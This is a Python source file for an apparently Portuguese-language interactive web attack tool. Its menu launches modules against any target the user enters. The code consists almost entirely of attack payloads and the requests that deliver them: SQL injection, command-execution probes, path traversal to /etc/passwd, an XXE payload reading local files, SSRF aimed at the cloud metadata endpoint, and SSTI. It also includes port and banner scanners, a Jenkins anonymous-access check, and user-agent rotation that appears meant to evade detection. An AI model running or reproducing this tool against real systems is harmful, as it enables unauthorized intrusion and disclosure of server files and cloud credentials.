import requests, paramiko, socket, threading, time, random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                   
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                    
                                                                    
                                                                    
  █████████                               █████                       
 ███░░░░░███                             ░░███                       
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███     
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
             ░███                                                  
             █████                                                
            ░░░░░                                                  
'''

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    ]
    return random.choice(agents)

class SQLiExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "' OR SLEEP(5)-- ",
            "' OR BENCHMARK(1000000,MD5(1))-- ",
            "' OR '1'='1' -- ",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SLEEP(3))-- ",
        ]
        self.delay_threshold = 3

    def extract_params(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        return list(qs.keys())

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        return new_url

    def is_vulnerable(self, resp):
        errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "mysql_fetch_array()",
            "syntax error",
        ]
        content = resp.text.lower()
        return any(e in content for e in errors)

    def run(self):
        params = self.extract_params()
        if not params:
            print("[SQLi] Nenhum parâmetro encontrado na URL")
            return
        vulnerable = False
        for p in params:
            for payload in self.payloads:
                test_url = self.craft_url(p, payload)
                try:
                    start = time.time()
                    r = self.session.get(test_url, timeout=10, verify=False)
                    elapsed = time.time() - start
                except Exception as e:
                    print(f"[SQLi] Erro na requisição: {e}")
                    continue
                if self.is_vulnerable(r):
                    print(f"[SQLi] Vulnerabilidade por erro detectada no parâmetro '{p}' com payload '{payload}'")
                    vulnerable = True
                if elapsed > self.delay_threshold:
                    print(f"[SQLi] Vulnerabilidade time-based detectada no parâmetro '{p}' com payload '{payload}' (delay {elapsed:.2f}s)")
                    vulnerable = True
        if not vulnerable:
            print("[SQLi] Nenhuma vulnerabilidade detectada.")

class RCEExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "id",
            "uname -a",
            "whoami",
        ]
        self.common_params = ['cmd', 'command', 'exec', 'execute', 'shell']

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def run(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        params = list(qs.keys()) if qs else self.common_params
        vulnerable = False
        for param in params:
            for payload in self.payloads:
                test_url = self.craft_url(param, payload)
                try:
                    r = self.session.get(test_url, timeout=10, verify=False)
                    if r.status_code == 200 and any(x in r.text for x in ['uid=', 'Linux', 'root', 'users']):
                        print(f"[RCE] Possível execução de comando detectada no parâmetro '{param}' com payload '{payload}'")
                        vulnerable = True
                except Exception as e:
                    print(f"[RCE] Erro na requisição: {e}")
        if not vulnerable:
            print("[RCE] Nenhuma vulnerabilidade detectada.")

class LFIExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
        ]

    def extract_params(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        return list(qs.keys())

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def run(self):
        params = self.extract_params()
        if not params:
            print("[LFI] Nenhum parâmetro encontrado na URL")
            return
        vulnerable = False
        for param in params:
            for payload in self.payloads:
                test_url = self.craft_url(param, payload)
                try:
                    r = self.session.get(test_url, timeout=10, verify=False)
                    if "root:x:0:0:" in r.text or "daemon:x:" in r.text:
                        print(f"[LFI] Vulnerabilidade detectada no parâmetro '{param}' com payload '{payload}'")
                        vulnerable = True
                except Exception as e:
                    print(f"[LFI] Erro na requisição: {e}")
        if not vulnerable:
            print("[LFI] Nenhuma vulnerabilidade detectada.")

class XSSExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "<script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>",
        ]

    def extract_params(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        return list(qs.keys())

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def run(self):
        params = self.extract_params()
        if not params:
            print("[XSS] Nenhum parâmetro encontrado na URL")
            return
        vulnerable = False
        for param in params:
            for payload in self.payloads:
                test_url = self.craft_url(param, payload)
                try:
                    r = self.session.get(test_url, timeout=10, verify=False)
                    if payload in r.text:
                        print(f"[XSS] Possível vulnerabilidade refletida no parâmetro '{param}' com payload '{payload}'")
                        vulnerable = True
                except Exception as e:
                    print(f"[XSS] Erro na requisição: {e}")
        if not vulnerable:
            print("[XSS] Nenhuma vulnerabilidade detectada.")

class XXEExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})

    def run(self):
        xml_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''
        try:
            r = self.session.post(self.url, data=xml_payload, headers={'Content-Type': 'application/xml'}, timeout=10, verify=False)
            if "root:x:0:0:" in r.text or "daemon:x:" in r.text:
                print("[XXE] Vulnerabilidade detectada! Conteúdo /etc/passwd retornado.")
            else:
                print("[XXE] Nenhuma vulnerabilidade detectada.")
        except Exception as e:
            print(f"[XXE] Erro na requisição: {e}")

class SSRFExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "http://127.0.0.1/",
            "http://169.254.169.254/latest/meta-data/",  # AWS Metadata
            "http://localhost/",
        ]

    def extract_params(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        return list(qs.keys())

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def run(self):
        params = self.extract_params()
        if not params:
            print("[SSRF] Nenhum parâmetro encontrado na URL")
            return
        for param in params:
            for payload in self.payloads:
                test_url = self.craft_url(param, payload)
                try:
                    r = self.session.get(test_url, timeout=10, verify=False)
                    if r.status_code == 200:
                        print(f"[SSRF] Possível SSRF detectada no parâmetro '{param}' com payload '{payload}'")
                except Exception as e:
                    print(f"[SSRF] Erro na requisição: {e}")

class SSTIExploit:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})
        self.payloads = [
            "{{7*7}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ]

    def extract_params(self):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        return list(qs.keys())

    def craft_url(self, param, payload):
        parsed = urlparse(self.url)
        qs = parse_qs(parsed.query)
        qs[param] = payload
        new_query = urlencode(qs, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def run(self):
        params = self.extract_params()
        if not params:
            print("[SSTI] Nenhum parâmetro encontrado na URL")
            return
        for param in params:
            for payload in self.payloads:
                test_url = self.craft_url(param, payload)
                try:
                    r = self.session.get(test_url, timeout=10, verify=False)
                    if '49' in r.text or 'config' in r.text:
                        print(f"[SSTI] Possível SSTI detectada no parâmetro '{param}' com payload '{payload}'")
                except Exception as e:
                    print(f"[SSTI] Erro na requisição: {e}")

class HTTPMethodScanner:
    def __init__(self, url):
        self.url = url if url.startswith('http') else 'http://' + url
        self.methods = ['GET','POST','PUT','DELETE','OPTIONS','TRACE','CONNECT','PATCH']

    def run(self):
        allowed = []
        for method in self.methods:
            try:
                r = requests.request(method, self.url, timeout=10, verify=False)
                if r.status_code < 400:
                    allowed.append(method)
            except Exception:
                continue
        print(f"[HTTP Methods] Permitidos no alvo: {', '.join(allowed)}")

class JenkinsExploit:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random_user_agent()})

    def check_anonymous(self):
        try:
            r = self.session.get(self.url + "/script", timeout=10, verify=False)
            if r.status_code == 200 and "jenkins" in r.text.lower():
                print("[Jenkins] Acesso anônimo permitido!")
            else:
                print("[Jenkins] Acesso anônimo não permitido ou serviço não encontrado.")
        except Exception as e:
            print(f"[Jenkins] Erro na requisição: {e}")

class DNSExfiltration:
    def __init__(self, domain):
        self.domain = domain

    def run(self):
        print(f"[DNS Exfiltration] Use ferramentas externas para monitorar DNS para o domínio: {self.domain}")

class BannerGrabber:
    def __init__(self, host, port=80):
        self.host = host
        self.port = port

    def run(self):
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(b"HEAD / HTTP/1.1\r\nHost: %b\r\n\r\n" % self.host.encode())
            banner = sock.recv(1024).decode()
            print(f"[BannerGrabber] Banner recebido:\n{banner}")
            sock.close()
        except Exception as e:
            print(f"[BannerGrabber] Erro: {e}")

class SSHScanner:
    def __init__(self, host, port=22, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout

    def run(self):
        try:
            sock = socket.socket()
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            sock.close()
            print(f"[SSHScanner] Porta SSH {self.port} aberta no host {self.host}")
        except Exception as e:
            print(f"[SSHScanner] Porta SSH {self.port} fechada ou inacessível em {self.host}")

def main_menu():
    print(ASCII_ART)
    print("Escolha uma opção:\n")
    print("1 - SQL Injection")
    print("2 - Remote Code Execution (RCE)")
    print("3 - Local File Inclusion (LFI)")
    print("4 - Cross-site Scripting (XSS)")
    print("5 - XML External Entity (XXE)")
    print("6 - Server Side Request Forgery (SSRF)")
    print("7 - Server Side Template Injection (SSTI)")
    print("8 - HTTP Methods Scanner")
    print("9 - Jenkins Anonymous Access")
    print("10 - DNS Exfiltration info")
    print("11 - Banner Grabber")
    print("12 - SSH Scanner")
    print("0 - Sair\n")

def main():
    while True:
        main_menu()
        choice = input("Digite a opção: ").strip()
        if choice == '0':
            print("Saindo...")
            break
        target = input("Digite a URL ou host alvo: ").strip()

        if choice == '1':
            SQLiExploit(target).run()
        elif choice == '2':
            RCEExploit(target).run()
        elif choice == '3':
            LFIExploit(target).run()
        elif choice == '4':
            XSSExploit(target).run()
        elif choice == '5':
            XXEExploit(target).run()
        elif choice == '6':
            SSRFExploit(target).run()
        elif choice == '7':
            SSTIExploit(target).run()
        elif choice == '8':
            HTTPMethodScanner(target).run()
        elif choice == '9':
            JenkinsExploit(target).check_anonymous()
        elif choice == '10':
            DNSExfiltration(target).run()
        elif choice == '11':
            port = input("Digite a porta (default 80): ").strip()
            port = int(port) if port.isdigit() else 80
            BannerGrabber(target, port).run()
        elif choice == '12':
            port = input("Digite a porta SSH (default 22): ").strip()
            port = int(port) if port.isdigit() else 22
            SSHScanner(target, port).run()
        else:
            print("Opção inválida!")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()


